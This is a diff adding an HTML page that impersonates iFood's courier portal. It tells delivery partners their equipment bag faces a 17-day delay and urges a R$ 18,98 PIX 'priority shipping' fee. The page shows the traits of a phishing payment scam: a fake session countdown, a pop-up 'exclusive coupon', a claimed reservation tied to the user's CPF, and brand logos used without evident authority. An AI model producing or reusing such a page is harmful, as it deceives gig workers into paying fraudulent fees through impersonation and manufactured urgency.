@@ -1,0 +1,101 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#EA1D2C">
+    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#EA1D2C">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <title>iFood Entregador - Prioridade de Envio</title>
+    <meta name="description" content="Sua bag ja esta na fila de envio. Ative prioridade para receber em 1 dia.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css?v=3.8">
+</head>
+
+<body data-page="upsell">
+    <header class="header">
+        <div class="logo-container">
+            <img src="assets/ifoodentregadores.webp" alt="iFood Entregador" class="ifood-logo ifood-logo--wide">
+        </div>
+    </header>
+
+    <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>
+
+    <main class="container">
+        <section class="step upsell-step" aria-hidden="false">
+            <div class="badge-container">
+                <span class="badge">Bag reservada</span>
+            </div>
+
+            <h2 class="upsell-title">Sua bag ja entrou na fila de envio, <span id="upsell-lead-name">parceiro</span>.</h2>
+            <p class="upsell-subtitle">Devido ao alto volume de resgates, o prazo padrao foi ampliado para ate 17 dias.</p>
+
+            <div class="upsell-image-slot" id="upsell-image-slot" aria-label="Imagem da oferta de adiantamento">
+                <img src="assets/upsellfoto.webp" alt="Oferta de prioridade de envio da bag iFood" class="upsell-image-slot__img" loading="eager" decoding="async">
+            </div>
+
+            <div class="upsell-urgency" id="upsell-urgency">
+                <div class="upsell-urgency__left">
+                    <strong>Receba em 1 dia com prioridade de envio</strong>
+                    <span>Oferta desta sessao expira em <b id="upsell-timer">10:00</b></span>
+                </div>
+                <div class="upsell-urgency__price">
+                    <span>Taxa unica</span>
+                    <strong>R$ 18,98</strong>
+                </div>
+            </div>
+
+            <div class="upsell-explain" id="upsell-explain">
+                <h3>Por que pagar R$ 18,98?</h3>
+                <p>Essa taxa ativa a <strong>prioridade logistica</strong> da sua bag nesta sessao.</p>
+                <ul>
+                    <li>Separacao prioritaria no centro de distribuicao</li>
+                    <li>Despacho acelerado para recebimento em 1 dia</li>
+                    <li>Atualizacao de rastreio no mesmo dia da liberacao</li>
+                </ul>
+            </div>
+
+            <div class="action-stack">
+                <button id="btn-upsell-accept" class="btn-primary" type="button">Pagar R$ 18,98 e receber em 1 dia</button>
+            </div>
+
+            <div id="upsell-loading" class="inline-loading hidden" aria-hidden="true">
+                <div class="spinner spinner--sm" aria-hidden="true"></div>
+                <span>Gerando PIX do adiantamento...</span>
+            </div>
+
+            <p class="small-text">A bag segue reservada para seu CPF nesta sessao.</p>
+        </section>
+    </main>
+
+    <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>
+
+    <div id="coupon-modal" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="coupon-title">
+        <div class="modal-card">
+            <div class="coupon-hero">
+                <img src="assets/bagfoto.webp" alt="Bag iFood com desconto">
+            </div>
+            <span class="modal-badge">Cupom exclusivo</span>
+            <h3 id="coupon-title">Desconto liberado no frete</h3>
+            <p id="coupon-message">Voce ganhou R$ 5,00 de desconto no frete da Bag.</p>
+            <span class="coupon-subtitle">Oferta valida agora nesta sessao</span>
+            <button id="btn-coupon-apply" class="btn-primary" type="button">Usar cupom e pagar mais barato</button>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
+    </footer>
+
+    <script src="script.js?v=11.0" defer=""></script>
+</body>
+
+</html>
+
+
+
+
